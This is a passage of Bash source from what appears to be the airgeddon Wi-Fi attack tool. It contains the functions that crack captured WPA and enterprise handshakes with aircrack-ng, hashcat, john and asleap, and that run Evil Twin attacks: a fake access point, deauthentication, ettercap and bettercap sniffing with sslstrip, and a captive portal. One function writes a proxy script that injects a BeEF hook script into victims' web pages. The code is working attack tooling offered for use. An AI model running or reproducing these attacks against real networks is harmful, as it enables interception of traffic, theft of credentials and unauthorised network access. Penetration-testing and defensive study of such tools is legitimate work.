	language_strings "${language}" 116
	language_strings "${language}" 249
	language_strings "${language}" 308
	language_strings "${language}" 320
	language_strings "${language}" 482
	language_strings "${language}" 58
	language_strings "${language}" 331
	language_strings "${language}" 519
	language_strings "${language}" 687
	print_hint ${current_menu}

	read -rp "> " captive_portal_language_selected
	echo
	case ${captive_portal_language_selected} in
		0)
			return_to_et_main_menu=1
			return 1
		;;
		1)
			captive_portal_language="ENGLISH"
		;;
		2)
			captive_portal_language="SPANISH"
		;;
		3)
			captive_portal_language="FRENCH"
		;;
		4)
			captive_portal_language="CATALAN"
		;;
		5)
			captive_portal_language="PORTUGUESE"
		;;
		6)
			captive_portal_language="RUSSIAN"
		;;
		7)
			captive_portal_language="GREEK"
		;;
		8)
			captive_portal_language="ITALIAN"
		;;
		9)
			captive_portal_language="POLISH"
		;;
		10)
			captive_portal_language="GERMAN"
		;;
		11)
			captive_portal_language="TURKISH"
		;;
		12)
			captive_portal_language="ARABIC"
		;;
		*)
			invalid_captive_portal_language_selected
		;;
	esac

	return 0
}

#Read and validate the minlength var
function set_minlength() {

	debug_print

	local regexp
	if [ "${1}" = "personal" ]; then
		regexp="^[8-9]$|^[1-5][0-9]$|^6[0-3]$"
		minlength_text=8
	else
		regexp="^[1-9]$|^[1-5][0-9]$|^6[0-3]$"
		minlength_text=1
	fi

	minlength=0
	while [[ ! ${minlength} =~ ${regexp} ]]; do
		echo
		language_strings "${language}" 194 "green"
		read -rp "> " minlength
	done
}

#Read and validate the maxlength var
function set_maxlength() {

	debug_print

	local regexp
	if [ "${1}" = "personal" ]; then
		regexp="^[8-9]$|^[1-5][0-9]$|^6[0-3]$"
	else
		regexp="^[1-9]$|^[1-5][0-9]$|^6[0-3]$"
	fi

	maxlength=0
	while [[ ! ${maxlength} =~ ${regexp} ]]; do
		echo
		language_strings "${language}" 195 "green"
		read -rp "> " maxlength
	done
}

#Manage the minlength and maxlength vars on bruteforce attacks
function set_minlength_and_maxlength() {

	debug_print

	set_minlength "${1}"
	maxlength=0
	while [[ ${maxlength} -lt ${minlength} ]]; do
		set_maxlength "${1}"
	done
}

#Charset selection menu
function set_charset() {

	debug_print

	clear
	language_strings "${language}" 238 "title"
	language_strings "${language}" 196 "green"
	print_simple_separator
	language_strings "${language}" 197
	language_strings "${language}" 198
	language_strings "${language}" 199
	language_strings "${language}" 200
	language_strings "${language}" 201
	language_strings "${language}" 202
	language_strings "${language}" 203
	language_strings "${language}" 204
	language_strings "${language}" 205
	language_strings "${language}" 206
	language_strings "${language}" 207
	print_hint ${current_menu}

	read -rp "> " charset_option
	case ${1} in
		"aircrack"|"jtr")
			case ${charset_option} in
				1)
					charset=${crunch_lowercasecharset}
				;;
				2)
					charset=${crunch_uppercasecharset}
				;;
				3)
					charset=${crunch_numbercharset}
				;;
				4)
					charset=${crunch_symbolcharset}
				;;
				5)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}"
				;;
				6)
					charset="${crunch_lowercasecharset}${crunch_numbercharset}"
				;;
				7)
					charset="${crunch_uppercasecharset}${crunch_numbercharset}"
				;;
				8)
					charset="${crunch_symbolcharset}${crunch_numbercharset}"
				;;
				9)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_numbercharset}"
				;;
				10)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_symbolcharset}"
				;;
				11)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_numbercharset}${crunch_symbolcharset}"
				;;
			esac
		;;
		"hashcat")
			case ${charset_option} in
				1)
					charset="?l"
				;;
				2)
					charset="?u"
				;;
				3)
					charset="?d"
				;;
				4)
					charset="?s"
				;;
				5)
					charset="-1 ?l?u"
				;;
				6)
					charset="-1 ?l?d"
				;;
				7)
					charset="-1 ?u?d"
				;;
				8)
					charset="-1 ?s?d"
				;;
				9)
					charset="-1 ?l?u?d"
				;;
				10)
					charset="-1 ?l?u?s"
				;;
				11)
					charset="?a"
				;;
			esac

			if [[ ${charset} =~ ^\-1 ]]; then
				charset_tmp=""
				for ((i=0; i < maxlength; i++)); do
					charset_tmp+="?1"
				done
				charset="\"${charset}\" \"${charset_tmp}\""
			else
				charset_tmp=${charset}
				for ((i=0; i < maxlength - 1; i++)); do
					charset+=${charset_tmp}
				done
			fi
		;;
	esac

	set_show_charset "${1}"
}

#Set a var to show the chosen charset
function set_show_charset() {

	debug_print

	showcharset=""

	case ${1} in
		"aircrack"|"jtr")
			showcharset="${charset}"
		;;
		"hashcat")
			case ${charset_tmp} in
				"?a")
					for item in "${hashcat_charsets[@]}"; do
						if [ "${hashcat_charset_fix_needed}" -eq 0 ]; then
							showcharset+=$(hashcat --help | grep "${item} =" | awk '{print $3}')
						else
							showcharset+=$(hashcat --help | grep -E "^  ${item#'?'} \|" | awk '{print $3}')
						fi
					done
				;;
				*)
					if [[ ${charset} =~ ^\"\-1[[:blank:]]((\?[luds])+).* ]]; then
						showcharset="${BASH_REMATCH[1]}"
						IFS='?' read -ra charset_masks <<< "${showcharset}"
						showcharset=""
						for item in "${charset_masks[@]}"; do
							if [ -n "${item}" ]; then
								if [ "${hashcat_charset_fix_needed}" -eq 0 ]; then
									showcharset+=$(hashcat --help | grep "${item} =" | awk '{print $3}')
								else
									showcharset+=$(hashcat --help | grep -E "^  ${item} \|" | awk '{print $3}')
								fi
							fi
						done
					else
						if [ "${hashcat_charset_fix_needed}" -eq 0 ]; then
							showcharset=$(hashcat --help | grep "${charset_tmp} =" | awk '{print $3}')
						else
							showcharset=$(hashcat --help | grep -E "^  ${charset_tmp#'?'} \|" | awk '{print $3}')
						fi
					fi
				;;
			esac
		;;
	esac
}

#Execute aircrack+crunch bruteforce attack
function exec_aircrack_bruteforce_attack() {

	debug_print
	rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
	aircrack_cmd="crunch \"${minlength}\" \"${maxlength}\" \"${charset}\" | aircrack-ng -a 2 -b \"${bssid}\" -l \"${tmpdir}${aircrack_pot_tmp}\" -w - \"${enteredpath}\" ${colorize}"
	eval "${aircrack_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute aircrack dictionary attack
function exec_aircrack_dictionary_attack() {

	debug_print

	rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
	aircrack_cmd="aircrack-ng -a 2 -b \"${bssid}\" -l \"${tmpdir}${aircrack_pot_tmp}\" -w \"${DICTIONARY}\" \"${enteredpath}\" ${colorize}"
	eval "${aircrack_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute john the ripper dictionary attack
function exec_jtr_dictionary_attack() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1

	jtr_cmd="john \"${jtrenterpriseenteredpath}\" --format=netntlm-naive --wordlist=\"${DICTIONARY}\" --pot=\"${tmpdir}${jtr_pot_tmp}\" --encoding=UTF-8 | tee \"${tmpdir}${jtr_output_file}\" ${colorize}"
	eval "${jtr_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute john the ripper bruteforce attack
function exec_jtr_bruteforce_attack() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1

	jtr_cmd="crunch \"${minlength}\" \"${maxlength}\" \"${charset}\" | john \"${jtrenterpriseenteredpath}\" --stdin --format=netntlm-naive --pot=\"${tmpdir}${jtr_pot_tmp}\" --encoding=UTF-8 | tee \"${tmpdir}${jtr_output_file}\" ${colorize}"
	eval "${jtr_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute hashcat dictionary attack
function exec_hashcat_dictionary_attack() {

	debug_print

	if [ "${1}" = "personal_handshake" ]; then
		hashcat_cmd="hashcat -m 2500 -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	elif [ "${1}" = "personal_pmkid" ]; then
		tmpfiles_toclean=1
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m 22000 -a 0 \"${hashcatpmkidenteredpath}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	else
		tmpfiles_toclean=1
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m 5500 -a 0 \"${hashcatenterpriseenteredpath}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	fi
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute hashcat bruteforce attack
function exec_hashcat_bruteforce_attack() {

	debug_print

	if [ "${1}" = "personal_handshake" ]; then
		hashcat_cmd="hashcat -m 2500 -a 3 \"${tmpdir}${hashcat_tmp_file}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	elif [ "${1}" = "personal_pmkid" ]; then
		tmpfiles_toclean=1
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m 22000 -a 3 \"${hashcatpmkidenteredpath}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	else
		tmpfiles_toclean=1
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m 5500 -a 3 \"${hashcatenterpriseenteredpath}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	fi
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute hashcat rule based attack
function exec_hashcat_rulebased_attack() {

	debug_print

	if [ "${1}" = "personal_handshake" ]; then
		hashcat_cmd="hashcat -m 2500 -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	elif [ "${1}" = "personal_pmkid" ]; then
		tmpfiles_toclean=1
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m 22000 -a 0 \"${hashcatpmkidenteredpath}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	else
		tmpfiles_toclean=1
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m 5500 -a 0 \"${hashcatenterpriseenteredpath}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	fi
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute Enterprise smooth/noisy attack
function exec_enterprise_attack() {

	debug_print

	rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
	mkdir "${tmpdir}${enterprisedir}" > /dev/null 2>&1

	set_hostapd_wpe_config
	launch_fake_ap
	exec_et_deauth
	set_enterprise_control_script
	launch_enterprise_control_window
	write_enterprise_processes

	echo
	language_strings "${language}" 524 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi
	if [ ${enterprise_mode} = "noisy" ]; then
		restore_et_interface
	else
		if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
			if [ -f "${tmpdir}${enterprisedir}returning_vars.txt" ]; then

				local tmp_interface
				tmp_interface=$(grep -E "^interface=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_interface}" ]; then
					interface="${tmp_interface}"
				fi

				local tmp_phy_interface
				tmp_phy_interface=$(grep -E "^phy_interface=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_phy_interface}" ]; then
					phy_interface="${tmp_phy_interface}"
				fi

				local tmp_current_iface_on_messages
				tmp_current_iface_on_messages=$(grep -E "^current_iface_on_messages=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_current_iface_on_messages}" ]; then
					current_iface_on_messages="${tmp_current_iface_on_messages}"
				fi

				local tmp_ifacemode
				tmp_ifacemode=$(grep -E "^ifacemode=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_ifacemode}" ]; then
					ifacemode="${tmp_ifacemode}"
				fi

				rm -rf "${tmpdir}${enterprisedir}returning_vars.txt" > /dev/null 2>&1
			fi
		else
			restore_et_interface
		fi
	fi
	handle_enterprise_log
	handle_asleap_attack
	clean_tmpfiles
}

#Manage and handle asleap attack integrated on Evil Twin and Enterprise
function handle_asleap_attack() {

	debug_print

	if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
		local result
		result=$(cat "${tmpdir}${enterprisedir}${enterprise_successfile}")
		if [[ ${result} -eq 0 ]] || [[ ${result} -eq 2 ]]; then
			ask_yesno 537 "no"
			if [ "${yesno}" = "y" ]; then

				asleap_attack_finished=0

				if [ ${enterprise_mode} = "noisy" ]; then
					if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
						for item in "${!enterprise_captured_challenges_responses[@]}"; do
							enterprise_username="${item}"
						done

						echo
						language_strings "${language}" 542 "yellow"
					else
						select_captured_enterprise_user
					fi
				fi

				echo
				language_strings "${language}" 538 "blue"

				while [[ "${asleap_attack_finished}" != "1" ]]; do
					ask_dictionary
					echo
					exec_asleap_attack
					echo
					manage_asleap_pot
				done
			fi
		fi
	fi
}

#Menu for captured enterprise user selection
function select_captured_enterprise_user() {

	debug_print

	echo
	language_strings "${language}" 47 "green"
	print_simple_separator

	local counter=0
	local space="  "
	declare -A temp_array_enterpise_users
	for item in "${!enterprise_captured_challenges_responses[@]}"; do
		if [ ${counter} -gt 9 ]; then
			space=" "
		fi
		counter=$((counter + 1))
		echo "${counter}.${space}${item}"
		temp_array_enterpise_users[${counter}]="${item}"
	done
	print_simple_separator

	option_enterprise_user_selected=""
	while [[ -z "${option_enterprise_user_selected}" ]]; do
		read -rp "> " option_enterprise_user_selected
		if [[ ! "${option_enterprise_user_selected}" =~ ^[0-9]+$ ]] || [[ ${option_enterprise_user_selected} -lt 1 ]] || [[ ${option_enterprise_user_selected} -gt ${counter} ]]; then
			option_enterprise_user_selected=""
			echo
			language_strings "${language}" 543 "red"
		fi
	done

	enterprise_username="${temp_array_enterpise_users[${option_enterprise_user_selected}]}"
}

#Execute asleap attack
function exec_asleap_attack() {

	debug_print

	rm -rf "${tmpdir}${asleap_pot_tmp}" > /dev/null 2>&1

	if [ "${1}" != "offline_menu" ]; then
		[[ "${enterprise_captured_challenges_responses[${enterprise_username}]}" =~ (([0-9a-zA-Z]{2}:?)+)[[:blank:]]/[[:blank:]](.*) ]] && enterprise_asleap_challenge="${BASH_REMATCH[1]}" && enterprise_asleap_response="${BASH_REMATCH[3]}"
	fi
	asleap_cmd="asleap -C \"${enterprise_asleap_challenge}\" -R \"${enterprise_asleap_response}\" -W \"${DICTIONARY}\" -v | tee \"${tmpdir}${asleap_pot_tmp}\" ${colorize}"
	eval "${asleap_cmd}"
}

#Execute Evil Twin only Access Point attack
function exec_et_onlyap_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_et_control_script
	launch_et_control_window

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi
	restore_et_interface
	clean_tmpfiles
}

#Execute Evil Twin with sniffing attack
function exec_et_sniffing_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_ettercap_sniffing
	set_et_control_script
	launch_et_control_window

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi
	restore_et_interface
	if [ ${ettercap_log} -eq 1 ]; then
		parse_ettercap_log
	fi
	clean_tmpfiles
}

#Execute Evil Twin with sniffing+bettercap-sslstrip2 attack
function exec_et_sniffing_sslstrip2_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_bettercap_sniffing
	set_et_control_script
	launch_et_control_window

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi
	restore_et_interface
	if [ ${bettercap_log} -eq 1 ]; then
		parse_bettercap_log
	fi
	clean_tmpfiles
}

#Execute Evil Twin with sniffing+bettercap-sslstrip2/beef attack
function exec_et_sniffing_sslstrip2_beef_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	if [ "${beef_found}" -eq 1 ]; then
		get_beef_version
		set_beef_config
	else
		new_beef_pass="beef"
		et_misc_texts[${language},27]=${et_misc_texts[${language},27]/${beef_pass}/${new_beef_pass}}
		beef_pass="${new_beef_pass}"

	fi
	launch_beef
	launch_bettercap_sniffing
	set_et_control_script
	launch_et_control_window

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_beef
	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi
	restore_et_interface
	if [ ${bettercap_log} -eq 1 ]; then
		parse_bettercap_log
	fi
	clean_tmpfiles
}

#Execute captive portal Evil Twin attack
function exec_et_captive_portal_attack() {

	debug_print

	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_et_control_script
	launch_et_control_window
	launch_dns_blackhole
	set_webserver_config
	set_captive_portal_page
	launch_webserver
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi
	restore_et_interface
	clean_tmpfiles
}

#Create configuration files for bettercap
function set_bettercap_config() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${bettercap_config_file}" > /dev/null 2>&1

	if [ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]; then

		rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1

		{
		echo -e "set http.proxy.script ${bettercap_hook_file}"
		} >> ${tmpdir}${bettercap_config_file}

		{
		echo -e "function onLoad() {"
		echo -e "\tlog('BeefInject loaded.');"
		echo -e "\tlog('targets: ' + env['arp.spoof.targets']);"
		echo -e "}\n"
		echo -e "function onResponse(req, res) {"
		echo -e "\tif (res.ContentType.indexOf('text/html') == 0) {"
		echo -e "\t\tvar body = res.ReadBody();"
		echo -e "\t\tif (body.indexOf('</head>') != -1) {"
		echo -e "\t\t\tres.Body = body.replace('</head>', '<script type=\"text/javascript\" src=\"http://${et_ip_router}:${beef_port}/${jshookfile}\"></script></head>');"
		echo -e "\t\t}"
		echo -e "\t}"
		echo -e "}"
		} >> ${tmpdir}${bettercap_hook_file}
	fi

	{
	echo -e "set http.proxy.port ${bettercap_proxy_port}"
	echo -e "set http.proxy.sslstrip true"
	echo -e "http.proxy on\n"
	echo -e "set net.sniff.verbose true"
	echo -e "net.recon on"
	echo -e "net.sniff on\n"
	echo -e "events.stream off"
	echo -e "set events.stream.http.request.dump true\n"
	echo -e "events.ignore net.sniff.http.response"
	echo -e "events.ignore http.proxy.spoofed-response"
	echo -e "events.ignore net.sniff.dns"
	echo -e "events.ignore net.sniff.tcp"
	echo -e "events.ignore net.sniff.udp"
	echo -e "events.ignore net.sniff.mdns"
	echo -e "events.ignore net.sniff.sni"
	echo -e "events.ignore net.sniff.https\n"
	echo -e "events.stream on"
	} >> ${tmpdir}${bettercap_config_file}
}

#Create configuration file for hostapd
function set_hostapd_config() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1

	local digit_to_change
	digit_to_change="${bssid:10:1}"
	(( different_mac_digit=("16#${digit_to_change}" + 1 + RANDOM % 15) % 16 ))
	et_bssid=$(printf %s%X%s\\n "${bssid::10}" "${different_mac_digit}" "${bssid:11}")

	{
	echo -e "interface=${interface}"
	echo -e "driver=nl80211"
	echo -e "ssid=${essid}"
	echo -e "bssid=${et_bssid}"
	} >> "${tmpdir}${hostapd_file}"

	if [[ "${channel}" -gt 14 ]]; then
		et_channel=$(shuf -i 1-11 -n 1)
	else
		et_channel="${channel}"
	fi

	{
	echo -e "channel=${et_channel}"
	} >> "${tmpdir}${hostapd_file}"
}

#Create configuration file for hostapd
function set_hostapd_wpe_config() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1

	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n 100 | grep -v "${bssid:10:1}" | head -c 1)
	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}

	{
	echo -e "interface=${interface}"
	echo -e "driver=nl80211"
	echo -e "ssid=${essid}"
	echo -e "bssid=${et_bssid}"
	} >> "${tmpdir}${hostapd_wpe_file}"

	if [[ "${channel}" -gt 14 ]]; then
		et_channel=$(shuf -i 1-11 -n 1)
	else
		et_channel="${channel}"
	fi

	{
	echo -e "channel=${et_channel}"
	echo -e "eap_server=1"
	echo -e "eap_fast_a_id=101112131415161718191a1b1c1d1e1f"
	echo -e "eap_fast_a_id_info=hostapd-wpe"
	echo -e "eap_fast_prov=3"
	echo -e "ieee8021x=1"
	echo -e "pac_key_lifetime=604800"
	echo -e "pac_key_refresh_time=86400"
	echo -e "pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f"
	echo -e "wpa=2"
	echo -e "wpa_key_mgmt=WPA-EAP"
	echo -e "wpa_pairwise=CCMP"
	echo -e "rsn_pairwise=CCMP"
	echo -e "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user"
	} >> "${tmpdir}${hostapd_wpe_file}"

	{
	echo -e "ca_cert=${hostapd_wpe_cert_path}ca.pem"
	echo -e "server_cert=${hostapd_wpe_cert_path}server.pem"
	echo -e "private_key=${hostapd_wpe_cert_path}server.key"
	echo -e "private_key_passwd=${hostapd_wpe_cert_pass}"
	} >> "${tmpdir}${hostapd_wpe_file}"
}

#Launch hostapd and hostapd-wpe fake Access Point
function launch_fake_ap() {

	debug_print

	if [ -n "${enterprise_mode}" ]; then
		kill "$(ps -C hostapd-wpe --no-headers -o pid | tr -d ' ')" &> /dev/null
	else
		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
	fi

	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
		${airmon} check kill > /dev/null 2>&1
		nm_processes_killed=1
	else
		if [ "${check_kill_needed}" -eq 1 ]; then
			${airmon} check kill > /dev/null 2>&1
			nm_processes_killed=1
		fi
	fi

	if [ ${mac_spoofing_desired} -eq 1 ]; then
		set_spoofed_mac "${interface}"
	fi

	recalculate_windows_sizes
	local command
	local log_command

	if [ -n "${enterprise_mode}" ]; then
		rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
		command="hostapd-wpe \"${tmpdir}${hostapd_wpe_file}\""
		log_command=" | tee ${tmpdir}${hostapd_wpe_log}"
		hostapd_scr_window_position=${g1_topleft_window}
	else
		command="hostapd \"${tmpdir}${hostapd_file}\""
		log_command=""
		case ${et_mode} in
			"et_onlyap")
				hostapd_scr_window_position=${g1_topleft_window}
			;;
			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
				hostapd_scr_window_position=${g3_topleft_window}
			;;
			"et_sniffing_sslstrip2")
				hostapd_scr_window_position=${g4_topleft_window}
			;;
		esac
	fi
	manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${hostapd_scr_window_position} -T \"AP\"" "${command}${log_command}" "AP"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "${command}"
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi

	sleep 3
}

#Create configuration file for dhcpd
function set_dhcp_config() {

	debug_print

	if ! ip route | grep ${ip_range} > /dev/null; then
		et_ip_range=${ip_range}
		et_ip_router=${router_ip}
		et_broadcast_ip=${broadcast_ip}
		et_range_start=${range_start}
		et_range_stop=${range_stop}
	else
		et_ip_range=${alt_ip_range}
		et_ip_router=${alt_router_ip}
		et_broadcast_ip=${alt_broadcast_ip}
		et_range_start=${alt_range_start}
		et_range_stop=${alt_range_stop}
	fi

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}clts.txt" > /dev/null 2>&1
	ip link set "${interface}" up > /dev/null 2>&1

	{
	echo -e "authoritative;"
	echo -e "default-lease-time 600;"
	echo -e "max-lease-time 7200;"
	echo -e "subnet ${et_ip_range} netmask ${std_c_mask} {"
	echo -e "\toption broadcast-address ${et_broadcast_ip};"
	echo -e "\toption routers ${et_ip_router};"
	echo -e "\toption subnet-mask ${std_c_mask};"
	} >> "${tmpdir}${dhcpd_file}"

	if [ "${et_mode}" != "et_captive_portal" ]; then
		echo -e "\toption domain-name-servers ${internet_dns1}, ${internet_dns2};" >> "${tmpdir}${dhcpd_file}"
	else
		echo -e "\toption domain-name-servers ${et_ip_router};" >> "${tmpdir}${dhcpd_file}"
	fi

	{
	echo -e "\trange ${et_range_start} ${et_range_stop};"
	echo -e "}"
	} >> "${tmpdir}${dhcpd_file}"

	leases_found=0
	for item in "${!possible_dhcp_leases_files[@]}"; do
		if [ -f "${possible_dhcp_leases_files[${item}]}" ]; then
			leases_found=1
			key_leases_found=${item}
			break
		fi
	done

	if [ ${leases_found} -eq 1 ]; then
		echo -e "lease-file-name \"${possible_dhcp_leases_files[${key_leases_found}]}\";" >> "${tmpdir}${dhcpd_file}"
		chmod a+w "${possible_dhcp_leases_files[${key_leases_found}]}" > /dev/null 2>&1
	else
		touch "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
		echo -e "lease-file-name \"${possible_dhcp_leases_files[0]}\";" >> "${tmpdir}${dhcpd_file}"
		chmod a+w "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
	fi

	dhcp_path="${tmpdir}${dhcpd_file}"
	if hash apparmor_status 2> /dev/null; then
		if apparmor_status 2> /dev/null | grep dhcpd > /dev/null; then
			if [ -d /etc/dhcpd ]; then
				cp "${tmpdir}${dhcpd_file}" /etc/dhcpd/ 2> /dev/null
				dhcp_path="/etc/dhcpd/${dhcpd_file}"
			elif [ -d /etc/dhcp ]; then
				cp "${tmpdir}${dhcpd_file}" /etc/dhcp/ 2> /dev/null
				dhcp_path="/etc/dhcp/${dhcpd_file}"
			else
				cp "${tmpdir}${dhcpd_file}" /etc/ 2> /dev/null
				dhcp_path="/etc/${dhcpd_file}"
			fi
			dhcpd_path_changed=1
		fi
	fi
}

#Change mac of desired interface
function set_spoofed_mac() {

	debug_print

	current_original_mac=$(cat < "/sys/class/net/${1}/address" 2> /dev/null)

	if [ "${spoofed_mac}" -eq 0 ]; then
		spoofed_mac=1
		declare -gA original_macs
		original_macs["${1}"]="${current_original_mac}"
	else
		if [ -z "${original_macs[${1}]}" ]; then
			original_macs["${1}"]="${current_original_mac}"
		fi
	fi

	new_random_mac=$(od -An -N6 -tx1 /dev/urandom | sed -e 's/^  *//' -e 's/  */:/g' -e 's/:$//' -e 's/^\(.\)[13579bdf]/\10/')

	ip link set "${1}" down > /dev/null 2>&1
	ip link set dev "${1}" address "${new_random_mac}" > /dev/null 2>&1
	ip link set "${1}" up > /dev/null 2>&1
}

#Restore spoofed macs to original values
function restore_spoofed_macs() {

	debug_print

	for item in "${!original_macs[@]}"; do
		ip link set "${item}" down > /dev/null 2>&1
		ip link set dev "${item}" address "${original_macs[${item}]}" > /dev/null 2>&1
		ip link set "${item}" up > /dev/null 2>&1
	done
}

#Set routing state and firewall rules for Evil Twin attacks
function set_std_internet_routing_rules() {

	debug_print

	if [ "${routing_modified}" -eq 0 ]; then
		original_routing_state=$(cat /proc/sys/net/ipv4/ip_forward)
		save_iptables_nftables
	fi

	ip addr add ${et_ip_router}/${std_c_mask} dev "${interface}" > /dev/null 2>&1
	routing_modified=1

	clean_initialize_iptables_nftables

